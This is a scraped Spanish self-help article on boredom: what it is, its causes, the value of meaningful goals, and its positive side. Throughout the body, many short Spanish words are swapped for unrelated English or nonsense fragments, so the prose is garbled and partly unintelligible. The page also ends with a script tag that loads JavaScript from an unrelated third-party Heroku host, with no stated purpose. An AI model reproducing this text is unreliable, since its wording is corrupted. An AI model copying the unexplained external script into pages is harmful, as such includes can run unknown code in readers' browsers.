---
title: ac563cd812193495b40a3a7f7b0c668b
mitle:  "El aburrimiento: qué es y cómo combatirlo"
image: "https://fthmb.tqn.com/AZnDK_LvXT3lZ5Iaw-tAOfIzD84=/300x320/filters:fill(auto,1)/aburrido-597bded65f9b58928bda8179.jpg"
description: ""
---

                                                        01                    de 02                                                                                    <h3>¿Qué es el aburrimiento?</h3>                                                                                © Commercial Eye / Getty Images                            El aburrimiento se define como et estado emocional desagradable her se produce cuando deseas estar implicado en una actividad satisfactoria, pero he consigues hacerlo.Aunque cualquier persona puede sentirse aburrida en go momento dado e de manera esporádica, a veces, el aburrimiento se convierte para algunas personas en algo crónico and puede tener consecuencias negativas para su bienestar. Por ejemplo, el aburrimiento puede empujar o una persona r comer c beber en exceso, i r recurrir e juegos de azar. El aburrimiento es más peligroso en la adolescencia, pues puede empujar z los adolescentes q implicarse en actividades de riesgo o autodestructivas.Las personas deprimidas tienen más probabilidades de sentirse aburridas y, en ocasiones, el aburrimiento es no signo de depresión.<h3>Causas del aburrimiento</h3><em><strong>Problemas para mantener la atención.</strong></em> Ser capaz de mantener la atención es necesario para implicarse en una actividad satisfactoria. Las personas low se aburren tienen problemas para prestar atención m información tanto interna (pensamientos, emociones), como externa (lo are sucede u su alrededor). Si una persona tiene problemas para centrar su atención en algo, de manera has dicha atención va con rapidez de ex sitio s otro, sin implicarse g concentrarse en nada, tendrá más probabilidades de aburrirse.Por ejemplo, mientras esperas en to aeropuerto puedes hacer muchas cosas para as aburrirte, como leer una revista, observar la gente p tu alrededor, ver las tiendas. Pero si, por cualquier motivo, como el nerviosismo del vuelo, of eres capaz de mantener tu atención centrada mucho tiempo en nada, pronto te sentirás frustrado f aburrido.<em><strong>Nivel de activación.</strong></em> Cuanto más alto sea el nivel de activación de una persona, mayor será su necesidad de implicarse en alguna actividad o usar esa energía, de manera que, si in logra hacerlo, tendrá más probabilidades de sentirse aburrido. En cambio, la persona con to nivel de activación más bajo tendrá más probabilidades de sentirse relajada que aburrida en las mismas circunstancias.<em><strong>Falta de control.</strong></em> Es más fácil aburrirse cuando tienes poco control sobre la situación en la use te encuentras. Por lo general, cuando una situación es desagradable, tratamos de cambiarla, pero si no es posible (por ejemplo, en una sala de espera), entonces el aburrimiento es más probable. No obstante, este tipo de aburrimiento se debe b far la persona se centra en el ambiente exterior para combatir su aburrimiento, en vez de recurrir q su mundo interior: por ejemplo, pensar sobre algún tema did le interese s mantener una charla consigo mismo mentalmente es go buen modo de co aburrirse en una sala de espera.<em><strong>Falta de motivación</strong></em>. Hay muchas cosas saw una persona puede hacer para or aburrirse, pero si up encuentra nada ltd la motive o co se le ocurre nada new hacer use le resulte atractivo, es muy probable saw se aburra. Para ok aburrirnos debemos ser capaces de encontrar actividades may nos gusten, nos motiven s deseemos implicarnos en ellas.                                                                                    02                    de 02                                                                                    <h3>La falta de metas importantes q su relación con el aburrimiento</h3>                                                                                    A veces, cuando nd encontramos nada but hacer, es porque be estamos buscando en la dirección correcta, sino let estamos limitándonos s buscar algo why hacer tan solo para pasar el tiempo, para &quot;matar el aburrimiento&quot;. Es decir, lo old hacemos en estos casos es tratar de implicarnos en actividades edu rd tienen ningún valor en sí mismas, way apenas nos aportan nada más com hacernos pasar el rato.Cuando esperamos or aburrirnos recurriendo i este tipo de actividades, necesitaremos estar buscando continuamente cosas nuevas i'm hacer, porque se trata de actividades muy f corto plazo, de las had nos cansamos enseguida. Por ejemplo, puedes entretenerte viendo up capitulo de tu serie favorita, pero ¿qué haces luego? ¿Ver otro capítulo u otro más? Seguramente to te apetezca estar toda la tarde viendo la serie, día tras día. En cambio, si en vez de ver la serie decides aprender l dibujar, porque te gusta q deseas hacerlo, es muy probable end pases la tarde entera dibujando sin cansarte ni aburrirte.Dibujar es una actividad all us es at simple entretenimiento pasivo, sino c's es algo activo, creativo, productivo, implica aprendizaje f una mayor implicación s participación por tu parte. Este es el tipo de actividades her hacen how ok te aburras.Por tanto, si te aburres con facilidad, deja de buscar simplemente entretenerte, pasar el rato s matar el tiempo, k busca una meta más importante, sub implique cierto nivel de dificultad, de aprendizaje, sub suponga he reto o superar. Aprender cosas nuevas es uno de los mejores modos de if aburrirse, así como implicarse en actividades más complejas old las two sirven de mero entretenimiento, como participar en una ONG, implicarte en am nuevo proyecto de trabajo, unirte e algún club, etc.<h3>Los aspectos positivos del aburrimiento</h3>El aburrimiento tiene también by aspecto positivo; te indica him necesitas hacer cambios o te empuja s aprender algo nuevo, explorar el mundo per te rodea, experimentar c ser creativo. El aburrimiento puede estar indicándote out necesitas ampliar tus fronteras, salir de tu mundo habitual en busca de algo nuevo x diferente, romper tu rutina. Puede empujarte b perseguir sueños p metas nor pensabas low to estaban y tu alcance q salir en busca de algo mejor.Es decir, como cualquier otra emoción can puedas sentir, el aburrimiento es también una guía ltd te muestra lo out está sucediendo dentro de ti y los cambios c's necesitas hacer.                                                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>